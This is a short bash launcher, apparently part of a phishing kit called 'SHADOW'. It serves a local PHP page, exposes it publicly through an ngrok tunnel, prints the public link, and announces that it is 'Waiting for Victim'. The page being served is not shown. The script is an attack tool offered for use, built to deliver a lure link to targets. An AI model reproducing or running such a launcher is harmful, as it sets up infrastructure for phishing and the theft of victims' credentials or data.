#!/bin/bash
clear
echo -e "\e[1;32m"
figlet SHADOW
echo -e "\e[0m"
echo "[+] Starting Localhost..."
sleep 1
php -S 127.0.0.1:8080 > /dev/null 2>&1 &
echo "[+] Starting Ngrok..."
./ngrok http 8080 > /dev/null 2>&1 &
sleep 5
clear
echo "[*] Your link:"
curl -s localhost:4040/api/tunnels | grep -o 'https://[0-9a-z]*\.ngrok.io'
echo ""
echo "[*] Waiting for Victim..."
